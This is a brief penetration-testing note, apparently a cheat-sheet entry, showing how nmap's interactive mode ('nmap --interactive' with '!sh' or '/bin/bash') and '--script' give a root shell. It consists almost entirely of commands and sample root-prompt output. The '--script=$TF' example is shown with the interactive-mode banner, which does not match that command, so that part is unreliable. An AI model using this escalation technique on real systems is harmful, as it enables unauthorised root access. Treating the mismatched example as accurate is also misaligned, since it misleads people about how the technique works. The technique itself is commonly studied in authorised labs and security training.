In case of a nmap interactive shell using the ```nmap --interactive``` trick or ```nmap --script``` you will be dropped into a root shell that looks like this

```bash
$ nmap --script=$TF
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap>
```

you are root, running this gets you a bash shell
```bash
nmap> /bin/bash
root@ip-10-201-101-237:/tmp# 
```

entering ``!sh`` also works
```bash
$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
root@ip-10-201-101-237:/tmp# 
```
